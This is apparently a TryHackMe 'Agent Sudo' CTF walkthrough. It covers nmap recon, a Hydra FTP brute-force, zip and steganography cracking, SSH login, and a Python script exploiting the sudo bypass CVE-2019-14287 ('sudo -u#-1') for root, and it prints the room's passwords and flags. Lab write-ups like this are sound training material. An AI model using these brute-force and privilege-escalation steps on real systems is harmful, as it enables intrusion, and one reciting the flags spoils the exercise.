---

# Agent Sudo — TryHackMe Walkthrough

---

## 🕵️‍♂️ Introduction

Welcome agent — or should I say hacker?

*Agent Sudo* is one of those classic TryHackMe rooms that feels like a true mission. It combines enumeration, cracking, steganography, and privilege escalation in a way that’s just the right mix of frustrating and fun. You’re not just popping shells here — you’re uncovering a story, one clue at a time, chasing down shady agents and secrets buried in the shadows.

This walkthrough walks through every step I took to root the box, explain the logic, show the tools I used, and crack each stage open. Let’s begin your mission.

---

## 🔍 Step 1: Enumeration with Nmap

Every mission starts with recon. I fired up `nmap` and scanned all ports in aggressive mode to see what we were working with:

```bash
nmap -T4 -p- -A 10.10.82.230 -vvv
```

And here’s what came back:

```
21/tcp  open  ftp        vsftpd 3.0.3  
22/tcp  open  ssh        OpenSSH 7.6p1  
80/tcp  open  http       Apache httpd 2.4.29
```

> Q1: How many open ports?

> A1: 3

---

## 🌐 Step 2: Exploring the Website

With port 80 open, I went straight to the browser. But it wasn’t until I used a custom User-Agent with `curl` that something interesting popped up:

![Screenshot From 2025-05-17 22-45-57](https://github.com/user-attachments/assets/9e49e45e-0faf-497e-b723-df3f3b2bee43)

```bash
curl -A "C" -L http://10.10.82.230
```
![Screenshot From 2025-05-17 22-54-26](https://github.com/user-attachments/assets/1d833394-b0f0-44d6-a2ee-64db2b75de48)

I was greeted with this:

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP.
From, Agent R
```

Nice. We’ve got names. And perhaps a trail to follow.

> Q2: How you redirect yourself to a secret page?

> A2: user-agent

> Q3: What is the agent name?

> A3: chris

---

## 🔐 Step 3: FTP Bruteforce with Hydra

Since we now know a potential username — **chris** — and there's an FTP server up on port 21, I took a swing at it using Hydra:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.82.230 -vvv
```

Success:

```
[21][ftp] host: 10.10.82.230   login: chris   password: crystal
```

> Q4: FTP password

> A4: crystal

---

## 📁 Step 4: FTP Loot — Digging into the Files

After logging in with `ftp`, I found three files:

```
To_agentJ.txt  
cute-alien.jpg  
cutie.png
```

I pulled them all to my local machine.

![Screenshot From 2025-05-17 23-05-26](https://github.com/user-attachments/assets/00b7ca20-9d4d-4650-ab06-12a565a849e2)
---

## 🕵️ Step 5: Investigating `cutie.png`

Time to dig in. I ran `binwalk` on the PNG:

```bash
binwalk cutie.png
```

Boom — there was a ZIP archive hidden inside. Extracted it and tried to open... encrypted. But not for long 😈

I used `zip2john` and `john` to crack it:

```bash
zip2john hidden.zip > hash.txt  
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The password: **alien**

> Q5: Zip file password

> A5: alien

![Screenshot From 2025-05-17 23-21-09](https://github.com/user-attachments/assets/9fd22231-1f6c-4605-b7c0-33e8a1fdfc5c)

---

## 🧠 Step 6: CyberChef and Steghide

Inside the ZIP was a text file. But the contents were encoded. I tossed it into [CyberChef](https://gchq.github.io/CyberChef/) and after a little decoding, I recovered the string:

```
Area51
```

Which felt like the *perfect* steghide passphrase. So I tried it on the `.jpg`:

```bash
steghide extract -sf cute-alien.jpg
```

Password: `Area51`

Success. A file dropped with SSH credentials.

> Q6: steg password

> A6: Area51


![Screenshot From 2025-05-17 23-24-18](https://github.com/user-attachments/assets/554c8a91-5db5-49e3-a9c4-c3964bcf2aba)

---

## 🧑‍💻 Step 7: SSH Access

From the stego file, we now had:

* **Login:** james
* **Password:** hackerrules!

Time to SSH in:

```bash
ssh james@10.10.82.230
```

We’re in.

And right there in James’ home directory — the user flag:

```
b03d975e8c92a7c04146cfa7a5a313c7
```

> Q7: Who is the other agent (in full name)?

> A7: james

> Q8: SSH password

> A8: hackerrules!

> Q9: What is the user flag?

> A9: b03d975e8c92a7c04146cfa7a5a313c7

---

## 🖼️ Step 8: The Alien Photo

One file stood out: `Alien_autospy.jpg`.

I downloaded it for analysis:

```bash
scp james@10.10.82.230:Alien_autospy.jpg .
```

A quick reverse image search confirmed it: the infamous **Roswell alien autopsy**.

> Q10: What is the incident of the photo called?
> A10: Roswell alien autopsy

---

## ⚙️ Step 9: Privilege Escalation – CVE-2019-14287

James had `sudo` rights — and a known vulnerability (CVE-2019-14287) let us exploit it to run commands as root.

Here’s the Python script I used to automate the escalation:

```python
#!/usr/bin/python3
import os

username = input("Enter current username :")
os.system("sudo -l > priv")
os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

with open("binary") as binary_file:
    binary = binary_file.read().strip()

print("Lets hope it works")
os.system("sudo -u#-1 " + binary)
```

After running it:

```bash
python3 script.py
```

I got root.

Inside `/root/root.txt`, the final flag:

```
b53a02f55b57d4439e3341834d70c062
```

> Q11: CVE number for the escalation

> A11: CVE-2019-14287

> Q12: What is the root flag?

> A12: b53a02f55b57d4439e3341834d70c062


![Screenshot From 2025-05-17 23-32-29](https://github.com/user-attachments/assets/bd9deb51-7df3-4922-ad28-108e11fd79f3)

---

## 🎉 Bonus

> Q13: Who is Agent R?

> A13: DesKel

---

## 🧠 Conclusion

*Agent Sudo* was a joy to work through. It had all the ingredients of a great beginner-to-intermediate box: solid enumeration, some CTF-y tricks like steganography and CyberChef decoding, and a real-world CVE to cap it off. The story woven through the names and messages made it feel like more than just “pop a shell, get root.”

If you're practicing OSINT, CTF enumeration, or just want a fun box with lots of variety, this one’s a must. And hey — if you’re reading this after finishing the box yourself — congratulations, Agent. You’ve earned your badge.
